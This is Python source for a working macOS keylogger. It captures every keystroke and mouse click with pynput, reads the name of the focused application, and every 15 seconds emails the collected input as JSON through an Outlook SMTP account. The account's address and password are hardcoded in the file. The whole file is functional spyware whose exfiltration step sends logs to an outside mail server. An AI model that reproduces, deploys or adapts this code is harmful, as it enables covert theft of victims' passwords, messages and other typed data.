#!/usr/bin/env python3

from AppKit import NSWorkspace
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json
import os
from pynput import keyboard, mouse
import smtplib
import threading

"""
    MISCELLANEOUS
"""

def timestamp():
    right_now = datetime.now()
    return right_now.strftime('%d-%m-%Y %H%M-%S')

def sort_dict_descending_keys(dictionary):
    return sorted(dictionary.items(), key=lambda pair: pair[1], reverse=True)

"""
    EMAIL SENDING
"""

def construct_mime(email_address, contents):
    message = MIMEMultipart()
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = timestamp()
    message.attach(MIMEText(contents, 'plain'))
    
    return message

def send_email(json_string):
    address = 'keylogger-sap@outlook.com'
    pssword = 'MyK3yLogger124'
    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()
    server.login(address, pssword)

    mime_object = construct_mime(address, json_string)
    server.send_message(mime_object)

    server.quit()

"""
    APPLICATION TRACKING
"""

def get_focus_app_string():
    workspace = NSWorkspace.sharedWorkspace()
    return workspace.activeApplication()['NSApplicationName']

"""
    MONITORING
"""

class Monitor:
    def __init__(self):
        # settings
        self.log_folder = 'logs'
        self.log_interval = 15
        self.passphrase = 'fishing-in-the-river-champion'
        self.log_via_email = True

        # state variables
        self.logs = list()
        self.text = str()
        
        # listeners
        self.keys = keyboard.Listener(on_press=self.on_press)
        self.mice = mouse.Listener(on_click=self.on_click)
    
    def log_to_file(self, json_string):
        with open(f'{self.log_folder}/{timestamp()}.json', 'w') as log_file:
            log_file.write(json_string)
    
    def update_text(self):
        # don't update text if it is empty
        if not self.text:
            return

        self.logs.append({'o' : self.text})
        self.text = str()
    
    def create_log(self):
        # add the last piece of text if any
        self.update_text()
        # do not make a log if nothing has been recorded
        if not self.logs:
            return

        json_string = json.dumps(self.logs, indent=4)
        # for now we log even if there was no log contents
        if self.log_via_email:
            send_email(json_string)
        else:
            self.log_to_file(json_string)

        self.logs = list()
     
    def log_loop(self):
        timer = threading.Timer(interval=self.log_interval, function=self.log_loop)
        timer.daemon = True
        timer.start()

        self.create_log()
    
    def record_raw_input(self, input_dict):
        self.update_text()
        self.logs.append(input_dict)

    def on_press(self, key):
        # handle the None case and all falsey keyboard.Keys
        if not key:
            return

        if (key == keyboard.Key.esc):
            self.create_log()
            self.mice.stop()
            return False
        
        try:
            self.text += key.char
        # when we hit a special character we update all regular text
        except AttributeError:
            self.record_raw_input({'s' : key.name.upper()})

    # pass in x and y to follow expected parameters of on_click
    def on_click(self, x, y, button, pressed):
        if (pressed):
            self.record_raw_input({'m' : button.name.upper()})

    def run(self):
        # create the logs folder if it does not exist if running in file logging mode
        if not self.log_via_email:
            try:
                os.mkdir(self.log_folder)
            except FileExistsError:
                pass

        self.keys.start()
        self.mice.start()

        self.log_loop()

        self.keys.join()
        self.mice.join()
        
def main():
    monitor = Monitor()
    monitor.run()

if __name__ == '__main__':
    main()
